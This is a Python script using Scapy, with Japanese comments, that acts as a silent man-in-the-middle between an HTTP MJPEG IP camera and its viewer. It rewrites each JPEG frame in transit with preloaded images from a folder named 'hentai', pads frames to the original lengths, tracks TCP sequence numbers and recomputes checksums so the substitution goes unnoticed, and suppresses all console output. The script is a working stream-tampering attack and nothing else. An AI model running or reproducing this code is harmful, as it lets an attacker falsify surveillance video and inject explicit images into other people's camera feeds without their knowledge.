#!/usr/bin/env python3
# mjpeg_len_boundary_replace_seqrotor_nack.py
# - Quiet (no console output)
# - Pre-open L2 socket
# - Preload images (memoryview)
# - Replace only when TCP seq is in-order; else pass-through
# - Content-Type: image/jpeg + Content-Length を条件に本文だけ置換
# - 用意画像 < LEN は 0x22 パディング、パケット長は常に原文と一致
# - 同一パケットで --myboundary が始まったら、そこまでを本文として置換し、
#   以降は透過して次ヘッダ解析に継続
# - 画像選択はグローバル回転子で test1→…→testN→test1… と連続
# - 変更点：自作ACKを送らない／順序どおりは置換の有無に関わらず next_seq_cam を前進

from scapy.all import *
import os, re, threading

# ==== CONFIG ====
IF   = "イーサネット 2"            # 送受信に使うNIC
mac0 = "11:22:33:44:55:66"         # この機器のMAC
mac1 = "08:00:23:9c:31:ff"         # camera 側MAC
mac2 = "d0:bf:9c:e2:25:2d"         # viewer 側MAC
FILT = "tcp port 80 and ether dst " + mac0  # camera->viewer のHTTPのみ

JPEG_DIR = "./hentai"
BASENAME, START, END, EXT = "test", 1, 300, ".jpg"

BOUNDARY = b"--myboundary"
RE_CT = re.compile(br"Content[- ]type:\s*image/jpeg", re.IGNORECASE)
RE_CL = re.compile(br"Content[- ]length:\s*(\d+)", re.IGNORECASE)

PADDING_BYTE = b"\x22"
MIN_JPEG_LEN = 64
REG_KEEP     = max(len(BOUNDARY)+4, 128)  # boundary監視レジスタ長
HDRBUF_CAP   = 16384                      # ヘッダ蓄積バッファ上限

# Silence scapy
conf.verb = False
conf.use_pcap = True
try:
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    logging.getLogger("scapy").setLevel(logging.ERROR)
except Exception:
    pass

# ==== preload images (memoryview) ====
_IMGS = []
for i in range(START, END+1):
    p = os.path.join(JPEG_DIR, f"{BASENAME}{i}{EXT}")
    if not os.path.exists(p):
        continue
    try:
        with open(p, "rb") as f:
            b = f.read()
        if len(b) >= 4 and b[:2]==b"\xff\xd8" and b[-2:]==b"\xff\xd9":
            _IMGS.append(memoryview(b))
    except Exception:
        pass

if not _IMGS:
    raise SystemExit()  # 無言終了（画像ゼロ時）

# global rotor: test1→…→testN→test1…
_IMG_N = len(_IMGS)
_IMG_LOCK = threading.Lock()
_IMG_ROTOR = 0
def _next_img_index():
    global _IMG_ROTOR
    with _IMG_LOCK:
        i = _IMG_ROTOR
        _IMG_ROTOR = (i + 1) % _IMG_N
        return i

# Prebuilt padding block
_PAD_BLOCK = memoryview(PADDING_BYTE * 65536)

# ==== state ====
class Flow:
    __slots__ = (
        "phase","hdr_buf","body_left","cur_idx","cur_off","tail_reg",
        "ts_cam","ts_view","win_view","next_seq_cam"
    )
    def __init__(self):
        self.phase = "HEADER_WAIT"
        self.hdr_buf = b""
        self.body_left = 0
        self.cur_idx = 0          # 実際の選択は開始時にロータから
        self.cur_off = 0
        self.tail_reg = b""
        self.ts_cam = None
        self.ts_view = None
        self.win_view = None
        self.next_seq_cam = None  # カメラ→ビューワの次予想seq

flows = {}
lock  = threading.Lock()

MAC0, MAC1, MAC2 = mac0.lower(), mac1.lower(), mac2.lower()

# ==== TX socket ====
_TX = conf.L2socket(iface=IF)
def _tx(pkt_bytes):
    _TX.send(pkt_bytes)

# ==== helpers ====
def _emit_from_img(out, pos, need, img_mv, off):
    blen = len(img_mv); rem = need; co = off
    while rem and co < blen:
        take = blen - co
        if take > rem: take = rem
        out[pos:pos+take] = img_mv[co:co+take]
        pos += take; co += take; rem -= take
    return pos, co, rem

def _emit_pad(out, pos, need):
    view = _PAD_BLOCK; vlen = len(view); rem = need
    while rem:
        take = vlen if rem>vlen else rem
        out[pos:pos+take] = view[:take]
        pos += take; rem -= take
    return pos

def _parse_tsopt(tcp):
    tsval = tsecr = None
    for kind, val in (tcp.options or []):
        if kind == 'Timestamp' and isinstance(val, tuple) and len(val)==2:
            tsval, tsecr = val; break
    return tsval, tsecr

def _learn_cam(pkt, key):
    if not pkt.haslayer(TCP): return
    ts,_ = _parse_tsopt(pkt[TCP])
    if ts is None: return
    with lock:
        st = flows.get(key)
        if st is None: st = Flow(); flows[key] = st
        st.ts_cam = ts

def _learn_viewer(pkt, key):
    if not pkt.haslayer(TCP): return
    tsv,_ = _parse_tsopt(pkt[TCP]); win = pkt[TCP].window
    with lock:
        st = flows.get(key)
        if st is None: st = Flow(); flows[key] = st
        if tsv is not None: st.ts_view = tsv
        if win is not None: st.win_view = win

def _recalc_and_send(pkt):
    if pkt.haslayer(IP):
        pkt[IP].len = None
        pkt[IP].chksum = None
    if pkt.haslayer(TCP):
        pkt[TCP].chksum = None
    _tx(bytes(pkt))

def _send_to_viewer(orig, out_bytes):
    pkt = orig.copy()
    pkt[Ether].src = mac0; pkt[Ether].dst = mac2
    if pkt.haslayer(Raw): pkt[Raw].load = out_bytes
    else: pkt = pkt/Raw(load=out_bytes)
    _recalc_and_send(pkt)

def _fwd_to_viewer(pkt, key=None):
    if pkt.haslayer(TCP) and key is not None: _learn_cam(pkt, key)
    q = pkt.copy()
    q[Ether].src = mac0; q[Ether].dst = mac2
    _recalc_and_send(q)

def _fwd_to_camera(pkt, key=None):
    if pkt.haslayer(TCP) and key is not None: _learn_viewer(pkt, key)
    q = pkt.copy()
    q[Ether].src = mac0; q[Ether].dst = mac1
    _recalc_and_send(q)

# ==== payload transformer (LEN優先) ====
def _transform_payload(raw, st):
    L = len(raw)
    out = bytearray(L); out_pos = 0; i = 0

    while i < L:
        if st.phase == "HEADER_WAIT":
            remain = raw[i:]
            hb = st.hdr_buf
            buf = (hb[-HDRBUF_CAP:] + remain) if hb else remain
            pos = buf.find(b"\r\n\r\n")
            if pos == -1:
                out[out_pos:out_pos+len(remain)] = remain; out_pos += len(remain)
                nb = (hb + remain) if hb else remain
                if len(nb) > HDRBUF_CAP: nb = nb[-HDRBUF_CAP:]
                st.hdr_buf = nb
                break
            else:
                hdr_total = pos + 4
                cur_have = len(hb)
                need = hdr_total - cur_have
                if need > 0:
                    part = remain[:need]
                    out[out_pos:out_pos+need] = part; out_pos += need; i += need
                full_hdr = (hb + remain[:max(0, need)])[:hdr_total] if cur_have else remain[:hdr_total]
                is_jpeg = (RE_CT.search(full_hdr) is not None)
                mcl = RE_CL.search(full_hdr)
                declared = int(mcl.group(1)) if mcl else None

                if is_jpeg and (declared is not None) and (declared >= MIN_JPEG_LEN):
                    st.phase = "BODY_LEN"
                    st.hdr_buf = b""
                    st.body_left = declared
                    st.cur_idx  = _next_img_index()  # グローバル回転子
                    st.cur_off  = 0
                    st.tail_reg = b""
                    continue
                else:
                    st.hdr_buf = b""
                    rem = raw[i:L]
                    if rem:
                        out[out_pos:out_pos+len(rem)] = rem; out_pos += len(rem)
                    break

        elif st.phase == "BODY_LEN":
            tail = st.tail_reg; combined = tail + raw[i:L]
            bpos = combined.find(BOUNDARY)
            rem_pkt = L - i
            need = rem_pkt if st.body_left > rem_pkt else st.body_left

            if bpos != -1:
                start_in_cur = bpos - len(tail)
                if start_in_cur < 0: start_in_cur = 0
                cut = need if need < start_in_cur else start_in_cur

                img = _IMGS[st.cur_idx]
                out_pos, st.cur_off, rem_need = _emit_from_img(out, out_pos, cut, img, st.cur_off)
                if rem_need: out_pos = _emit_pad(out, out_pos, rem_need)
                i += cut; st.body_left -= cut

                if i < L:
                    rem = raw[i:L]
                    out[out_pos:out_pos+len(rem)] = rem; out_pos += len(rem)
                    nb = st.hdr_buf + rem
                    if len(nb) > HDRBUF_CAP: nb = nb[-HDRBUF_CAP:]
                    st.hdr_buf = nb

                st.phase = "HEADER_WAIT"; st.cur_off = 0; st.tail_reg = b""
                break

            img = _IMGS[st.cur_idx]
            out_pos, st.cur_off, rem_need = _emit_from_img(out, out_pos, need, img, st.cur_off)
            if rem_need: out_pos = _emit_pad(out, out_pos, rem_need)

            seg = raw[i:i+need]; tr = st.tail_reg
            if len(tr)+need <= REG_KEEP:
                st.tail_reg = tr + seg
            else:
                cut_from_tail = max(0, len(tr) - (REG_KEEP - need))
                st.tail_reg = (tr[cut_from_tail:] + seg)[-REG_KEEP:]

            i += need; st.body_left -= need

            if st.body_left <= 0:
                st.phase = "HEADER_WAIT"; st.cur_off = 0; st.tail_reg = b""
                if i < L:
                    rem = raw[i:L]
                    out[out_pos:out_pos+len(rem)] = rem; out_pos += len(rem)
                    nb = st.hdr_buf + rem
                    if len(nb) > HDRBUF_CAP: nb = nb[-HDRBUF_CAP:]
                    st.hdr_buf = nb
                break

        else:
            st.phase = "HEADER_WAIT"; st.hdr_buf = b""; st.tail_reg = b""

    if out_pos < L: out_pos = _emit_pad(out, out_pos, L - out_pos)
    elif out_pos > L: del out[L:]
    return bytes(out)

# ==== sniffer / main path ====
def maeta(pkt):
    if not pkt.haslayer(Ether): return
    src = pkt[Ether].src

    # viewer -> camera : 透過
    if src == MAC2:
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            key = (pkt[IP].dst, pkt[TCP].dport, pkt[IP].src, pkt[TCP].sport)
        else:
            key = None
        _fwd_to_camera(pkt, key); return

    # camera -> viewer
    if src == MAC1:
        if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
            _fwd_to_viewer(pkt, None); return

        ip = pkt[IP]
        # IPフラグメントは無加工で透過
        if (getattr(ip.flags, "MF", 0) != 0) or (getattr(ip, "frag", 0) != 0):
            _fwd_to_viewer(pkt, None); return

        tcp = pkt[TCP]
        raw_layer = pkt.getlayer(Raw)
        key = (ip.src, tcp.sport, ip.dst, tcp.dport)

        # データ無し (ACK/FIN/等) は透過
        if raw_layer is None:
            _fwd_to_viewer(pkt, key); return

        seg_seq = int(tcp.seq)
        seg_len = len(raw_layer.load)

        with lock:
            st = flows.get(key)
            if st is None:
                st = Flow()
                flows[key] = st
            expected = st.next_seq_cam

        if expected is None:
            # 初回：基準確定（順序扱いで置換・送出）
            out = _transform_payload(raw_layer.load, st)
            p = pkt.copy()
            if p.haslayer(Raw): p[Raw].load = out
            else: p = p/Raw(load=out)
            p[Ether].src = mac0; p[Ether].dst = mac2
            _recalc_and_send(p)
            with lock:
                st.next_seq_cam = seg_seq + seg_len
                flows[key] = st
            return

        if seg_seq != expected:
            # 順序外・再送・重複は無加工で透過（next_seq_camは進めない）
            _fwd_to_viewer(pkt, key)
            return

        # 順序どおり：置換の有無に関わらず next_seq_cam を前進させる
        out = _transform_payload(raw_layer.load, st)
        p = pkt.copy()
        if p.haslayer(Raw): p[Raw].load = out
        else: p = p/Raw(load=out)
        p[Ether].src = mac0; p[Ether].dst = mac2
        _recalc_and_send(p)
        with lock:
            st.next_seq_cam = expected + seg_len
            flows[key] = st
        return

if __name__ == "__main__":
    sniff(iface=IF, filter=FILT, prn=maeta, store=0)
